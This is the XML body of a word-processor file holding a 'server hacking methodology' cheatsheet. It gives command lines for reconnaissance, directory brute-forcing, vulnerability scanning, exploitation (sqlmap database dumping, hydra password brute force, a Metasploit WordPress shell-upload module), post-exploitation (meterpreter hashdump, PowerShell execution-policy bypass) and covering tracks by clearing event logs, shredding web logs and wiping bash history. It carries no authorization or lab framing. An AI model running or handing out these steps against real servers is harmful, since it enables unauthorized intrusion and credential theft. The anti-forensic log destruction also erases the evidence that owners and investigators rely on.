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Server Hacking Methodology - Practical Cheatsheet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Information Gathering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>nmap -sV -p 80,443 &lt;target&gt;      # Scan for services &amp; versions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>whatweb &lt;target&gt;                # Identify technologies used</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>curl -I http://&lt;target&gt;         # Grab server headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>wget http://&lt;target&gt;/robots.txt # Check for hidden files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>theHarvester -d &lt;domain&gt; -l 200 -b google  # Gather emails/domains</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>dnsrecon -d &lt;domain&gt;            # DNS enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Directory &amp; File Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>gobuster dir -u http://&lt;target&gt; -w /usr/share/wordlists/dirb/common.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>dirb http://&lt;target&gt; /usr/share/wordlists/dirb/common.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>nikto -h http://&lt;target&gt;        # Web server vulnerability scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://&lt;target&gt;/FUZZ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Vulnerability Scanning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>openvas-start                   # Start OpenVAS scanner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>nessus                          # Nessus vulnerability scanner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>nikto -h http://&lt;target&gt;        # Quick vulnerability check</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>wpscan --url http://&lt;target&gt;    # WordPress vulnerability scan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>sqlmap -u 'http://&lt;target&gt;/page.php?id=1' --dbs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;target&gt; http-get /admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>msfconsole                      # Launch Metasploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>use exploit/unix/webapp/wp_admin_shell_upload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>set RHOST &lt;target&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Post Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>meterpreter &gt; sysinfo           # System info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>meterpreter &gt; hashdump          # Extract password hashes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>powershell -exec bypass         # Execute PowerShell payloads</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>net user                         # Windows user info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>netsh advfirewall show allprofiles # Firewall status</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>6. Covering Tracks</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>meterpreter &gt; clearev           # Clear event logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>shred -u /var/log/apache2/access.log  # Wipe web logs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:t>echo &gt; ~/.bash_history          # Clear bash history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